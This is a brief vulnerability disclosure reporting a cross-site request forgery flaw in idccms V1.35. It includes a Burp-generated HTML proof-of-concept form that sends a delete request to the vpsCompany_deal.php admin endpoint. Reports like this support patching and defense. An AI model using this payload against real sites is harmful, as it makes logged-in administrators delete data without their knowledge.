
target:http://idccms.com/
version: V1.35

idccms V1.35 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/vpsCompany_deal.php?mudi=del&dataType=&dataTypeCN=%E4%B8%8A%E7%BA%A7%E6%B8%A0%E9%81%93%E5%95%86&theme=cs1&dataID=33

POC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/vpsCompany_deal.php?mudi=del&dataType=&dataTypeCN=%E4%B8%8A%E7%BA%A7%E6%B8%A0%E9%81%93%E5%95%86&theme=cs1&dataID=33" method="POST">
      
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
